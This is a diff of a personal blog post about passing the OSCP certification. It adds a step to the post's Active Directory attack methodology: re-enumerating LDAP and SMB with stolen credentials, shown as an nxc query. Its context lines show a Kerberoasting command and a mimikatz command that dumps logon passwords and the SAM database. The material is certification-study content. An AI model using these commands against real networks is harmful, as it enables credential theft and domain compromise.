@@ -6,7 +6,7 @@ image: https://i.ytimg.com/vi/qqGb25h-5Y8/maxresdefault.jpg
 featured: true
 title: How I Passed the OSCP
 date: 2024-09-18T18:38:38.550Z
-lastmod: 2024-09-20T13:27:46.092Z
+lastmod: 2024-09-20T13:32:33.467Z
 ---
 I passed the OSCP just six months into my cybersecurity journey, despite having limited prior experience.\
 Before this, I had mainly worked with MERN Stack Web Development and experimented with Arch Linux and was fully immersed in all things Linux.
@@ -224,6 +224,11 @@ When it comes to AD methodology is very important as missing one minor detail ca
 
 ### Got creds
 
+* After getting credentials always enumerate smb shares, ldap, ftp, etc again with the newly gained credentials. Look for description of users in ldap as you might discover credentials for a higher privileged user
+  ```bash
+  nxc ldap <ip> -u 'username' -p 'password' --query "(objectClass=*)" "*"
+  ```
+
 * Kerberoasting
   ```bash
   GetUserSPNs.py -dc-ip <ip> domain.com/user -request
@@ -274,7 +279,7 @@ When it comes to AD methodology is very important as missing one minor detail ca
   ```powershell
   .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
   ```
-* Enumerate files manually
+* Enumerate files manually. Use `tree /F` on `C:\Users` to display all files in the users directory recursively.
 
 ### Reverse Shells
 
